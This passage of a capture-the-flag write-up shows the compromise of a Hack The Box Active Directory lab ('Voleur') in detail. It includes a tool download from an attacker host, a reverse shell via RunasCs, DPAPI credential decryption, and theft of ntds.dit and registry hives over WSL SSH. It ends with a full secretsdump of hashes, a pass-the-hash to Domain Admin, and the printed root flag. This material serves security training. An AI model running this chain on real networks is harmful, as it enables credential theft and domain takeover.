d-----          6/5/2025   3:30 PM                Administrator
d-----         1/29/2025   7:11 AM                jeremy.combs
d-r---         1/28/2025  12:35 PM                Public
d-----         1/30/2025   3:39 AM                svc_backup
d-----         1/29/2025   4:47 AM                svc_ldap
d-----         1/29/2025   7:07 AM                svc_winrm
d-----         1/29/2025   4:53 AM                todd.wolfe

*Evil-WinRM* PS C:\Users> cd todd.wolfe
*Evil-WinRM* PS C:\Users\todd.wolfe> dir
Access to the path 'C:\Users\todd.wolfe' is denied.
At line:1 char:1
+ dir
+ ~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\todd.wolfe:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
*Evil-WinRM* PS C:\Users\todd.wolfe> cd ..
*Evil-WinRM* PS C:\Users> cd svc_backup
*Evil-WinRM* PS C:\Users\svc_backup> dir
Access to the path 'C:\Users\svc_backup' is denied.
At line:1 char:1
+ dir
+ ~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_backup:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
*Evil-WinRM* PS C:\Users\svc_backup> cd ..
*Evil-WinRM* PS C:\Users> cd jeremy_combs
Cannot find path 'C:\Users\jeremy_combs' because it does not exist.
At line:1 char:1
+ cd jeremy_combs
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\jeremy_combs:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand

*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and ObjectClass -eq "user"'
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Invoke-WebRequest -Uri "http://10.10.14.173:8081/RunasCs.exe" -OutFile "runas.exe"
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> runas.exe svc_ldap 'M1XyC9pW7qT5Vn' "cmd.exe" -r 10.10.14.173:8084
```

The discovery of a custom runas executable in the svc_winrm Documents folder suggested administrative tools or scripts left by system administrators. This tool provided the capability to execute commands as the svc_ldap user, effectively allowing impersonation and access to resources that svc_ldap could access.

**4.2 Deleted User Discovery (cf.** [https://activedirectorypro.com/restore-deleted-active-directory-user/](https://activedirectorypro.com/restore-deleted-active-directory-user/))

With our netcat listening on port 8084

```bash
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# nc -lvnp 8084                                                                                                                                
Listening on 0.0.0.0 8084
Connection received on 10.129.196.199 59702
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
whoami
voleur\svc_ldap

C:\Windows\system32>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and ObjectClass -eq "user"'
Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and ObjectClass -eq "user"'

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db

PS C:\Windows\system32> Restore-ADObject -Identity "CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb"

Restore-ADObject -Identity "CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb"
PS C:\Windows\system32> 
PS C:\Windows\system32> net user /domain
net user /domain

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap                 
todd.wolfe               
The command completed successfully.

```

The PowerShell query for deleted Active Directory objects revealed the presence of Todd Wolfe's deleted account. Deleted accounts often retain valuable data and credentials, as administrators may not properly clean up associated files and profiles when accounts are removed.

**Found:** Todd Wolfe (deleted user)

The account of Todd Wolfe was successfully restrored. Todd Wolfe is member of Second-Line Support

![Todd Wolfe on Bloodhound](/static/images/writeups/htb/voleur/todd_wolfe.png)

Once restored, we run runas.exe one more time to get access as todd.wolfe

```bash
┌──(hexhunter404㉿kali)-[~/Downloads]
└─$ nc -lvnp 8092
Listening on 0.0.0.0 8092
Connection received on 10.129.196.199 61323
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
voleur\todd.wolfe
C:\Windows\system32>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

Nothing was really interesting found inside C:\Users\todd.wolfe 

Next step is to explore C:\IT\Second-Line Support now that we have access to the folder.

**4.3 Archived Profile Discovery**

```bash
C:\Windows\system32> cd "C:\IT\Second-Line Support\Archived Users"
C:\Windows\system32> Get-ChildItem -Recurse -Force -Hidden

```

The exploration of archived user profiles revealed that the organization maintained copies of user data even after account deletion. This practice, while potentially useful for data recovery, creates significant security risks as it preserves sensitive information including cached credentials and DPAPI-protected data.

An important hidden folder discovered was (S-1-5-21-3927696377-1337352550-2781715495-1110 being the sid of todd.wolfe):

```bash
"Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110"
```

**4.4 DPAPI Files Extraction**

```bash
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# ntpdate voleur.htb && impacket-smbclient -k 'voleur.htb/todd.wolfe@dc.voleur.htb' -no-pass
2025-07-06 22:18:36.728139 (+0200) +28799.988984 +/- 0.009491 voleur.htb 10.129.196.199 s1 no-leap
CLOCK: time stepped by 28799.988984
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# cd Second-Line Support
# cd Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 14:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 13:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 13:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
# get BK-VOLEUR
# get Preferred

# cd Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 14:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
# exit

```

The extraction of DPAPI (Data Protection API) files represented a sophisticated attack vector. DPAPI is Windows' mechanism for protecting sensitive data like saved passwords and certificates. The files extracted included the master key file, backup key, and preferred key, which together could decrypt stored credentials.

**4.5 DPAPI Decryption**

```bash
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# impacket-dpapi masterkey -file  08949382-134f-4c63-b93c-ce52efc0aa88 -password NightT1meP1dg3on14 -sid S-1-5-21-3927696377-1337352550-2781715495-1110
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

```

The DPAPI master key decryption process required the user's password (NightT1meP1dg3on14) and Security Identifier (SID). 

**Master Key:** 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

**4.6 Credential Extraction**

```bash

┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

The credential extraction phase utilized the decrypted master key to recover stored Windows credentials. This attack vector highlights the risk of Windows' credential caching mechanisms, which are designed for user convenience but can be exploited by attackers with appropriate access.

**Credentials Discovered:**

- **Username:** jeremy.combs
- **Password:** qT3V9pLXyN7W4m
- **Target:** Domain:target=Jezzas_Account

The recovered credentials for jeremy.combs provided access to a higher-privileged user account, likely with access to additional resources and systems within the domain.

![Jeremy Combs on BloodHound](/static/images/writeups/htb/voleur/jeremy_combs.png)

---

## **Phase 5: WSL/SSH Access**

**5.1 Third-Line Support Access**

The escalation to jeremy.combs credentials provided access to the Third-Line Support folder, representing the highest tier of technical support within the organization. This folder contained sensitive administrative tools and documentation, including SSH private keys for system access.

```bash
# Get TGT for jeremy.combs
impacket-getTGT voleur.htb/jeremy.combs:qT3V9pLXyN7W4m
export KRB5CCNAME=/home/hexhunter404/Downloads/jeremy.combs.ccache

┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# ntpdate voleur.htb && impacket-smbclient -k 'voleur.htb/jeremy.combs@dc.voleur.htb' -no-pass             
2025-07-06 22:37:50.849882 (+0200) +28799.951925 +/- 0.012317 voleur.htb 10.129.196.199 s1 no-leap
CLOCK: time stepped by 28799.951925
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# cd Third-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 17:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 17:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 17:07:35 2025 Note.txt.txt
# get Note.txt.txt
# get id_rsa
# exit
                                                                                                                                                                                                                                       
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# cat Note.txt.txt                                                       
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

But there’s still an interesting folder Backups that even jeremy.combs cannot access

```bash
*Evil-WinRM* PS C:\IT\Third-Line Support> cd Backups
*Evil-WinRM* PS C:\IT\Third-Line Support\Backups> dir
Access to the path 'C:\IT\Third-Line Support\Backups' is denied.
At line:1 char:1
+ dir
+ ~~~
    + CategoryInfo          : PermissionDenied: (C:\IT\Third-Line Support\Backups:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

**5.2 SSH Key Analysis**

```bash
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# ssh-keygen -l -f id_rsa
3072 SHA256:+SJo12eqmKss6G70Hv3/wPrD2rXK9QY7fg8uUrxUeUw svc_backup@DC (RSA)
                                                                                       
```

The SSH key analysis revealed that the private key belonged to the svc_backup account on the domain controller. This discovery connected the unusual SSH service on port 2222 to the backup service account, suggesting a Linux subsystem used for backup operations.

**Key Identity:** svc_backup@DC (RSA)

**5.3 WSL Access**

```bash
                                                                                                                                                   
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# ssh -i id_rsa -p 2222 svc_backup@10.129.196.199
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  6 13:41:33 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   49%       IPv4 address for eth0: 10.129.196.199
  Swap usage:     1%

363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                                                                                                                                         [ OK ] 
svc_backup@DC:~$ cd /mnt/c/IT/Third-Line\ Support/Backups
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd Active\ Directory/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls -la
total 24592
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 03:49 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 08:11 ..
-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30 03:49 ntds.dit
-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30 03:49 ntds.jfm
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ file ntds.dit 
ntds.dit: Extensible storage engine DataBase, version 0x620, checksum 0x34ab375f, page size 8192, Windows version 10.0
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ cd ..
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd registry/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls -la
total 17952
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 03:49 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 08:11 ..
-rwxrwxrwx 1 svc_backup svc_backup    32768 Jan 30 03:30 SECURITY
-rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30 03:30 SYSTEM
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ file SECURITY
SECURITY: MS Windows registry file, NT/2000 or above
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ file SYSTEM
SYSTEM: MS Windows registry file, NT/2000 or above
```

The successful SSH connection confirmed the presence of Windows Subsystem for Linux (WSL) on the domain controller. This configuration allowed Linux-based tools and scripts to run on the Windows system, providing additional administrative capabilities but also creating new attack vectors.

**WSL Environment:** Ubuntu 20.04 LTS on Windows

The WSL environment provided access to the Windows file system through the `/mnt/c/` mount point. The backup folder contained critical system files that would normally be inaccessible to standard users, representing a significant security exposure.

**Critical Backups Found:**

- **Active Directory/** (ntds.dit, ntds.jfm)
- **registry/** (SYSTEM, SECURITY)

The discovery of Active Directory database files (ntds.dit) and registry hives (SYSTEM, SECURITY) represented the most critical finding of the entire penetration test. These files contain all domain user password hashes and system secrets.

**6.2 File Transfer**

```bash
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# scp -P 2222 -i id_rsa svc_backup@10.129.196.199:"/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" .
ntds.dit                           100%   24MB   2.5MB/s   00:09                                 
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# scp -P 2222 -i id_rsa svc_backup@10.129.196.199:"/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY" .        
SECURITY                           100%   32KB 189.5KB/s   00:00    
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# scp -P 2222 -i id_rsa svc_backup@10.129.196.199:"/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" .  
SYSTEM                             100%   18MB   3.0MB/s   00:05    
```

The file transfer operation utilized SCP (Secure Copy Protocol) to extract the critical backup files. The ability to access these files through the WSL environment bypassed normal Windows security controls and audit mechanisms.

**6.3 Domain Hash Extraction**

```bash
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM 
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up... 
```

The secrets extraction phase utilized Impacket's secretsdump tool to parse the Active Directory database and registry hives. This process extracted all domain user password hashes, including the Domain Administrator account, effectively providing complete domain compromise.

**Administrator NT Hash :** aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2

---

## **Phase 6: Domain Admin**

```bash
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# ntpdate voleur.htb && impacket-getTGT voleur.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 
2025-07-06 22:56:51.853291 (+0200) +28799.933401 +/- 0.013588 voleur.htb 10.129.196.199 s1 no-leap
CLOCK: time stepped by 28799.933401
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
                             
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# export KRB5CCNAME=/home/hexhunter404/Downloads/Administrator.ccache                                                                                                    
┌──(root㉿kali)-[/home/hexhunter404/Downloads]
└─# ntpdate voleur.htb && evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
2025-07-06 22:57:42.293729 (+0200) +28799.927044 +/- 0.011306 voleur.htb 10.129.196.199 s1 no-leap
CLOCK: time stepped by 28799.927044
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   1:12 AM           2308 Microsoft Edge.lnk
-ar---          7/5/2025   8:38 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
092ea0c8c50e977873d72cf015ba61d2

```

The final phase utilized the extracted Administrator hash to perform a pass-the-hash attack, obtaining a Kerberos ticket without knowing the plaintext password. This technique demonstrates how compromised password hashes can be leveraged for authentication in Windows environments.

The successful acquisition of Domain Administrator privileges provided complete control over the voleur.htb domain. This level of access allows for data exfiltration, system modification, and establishment of persistent access mechanisms.

**Root Flag:** 092ea0c8c50e977873d72cf015ba61d2



Writeup completed by HexHunter404 - HTB Pro Hacker #544
Machine solved on: [Date] | Writeup published on: {{ .Date.Format "August 1, 2025" }}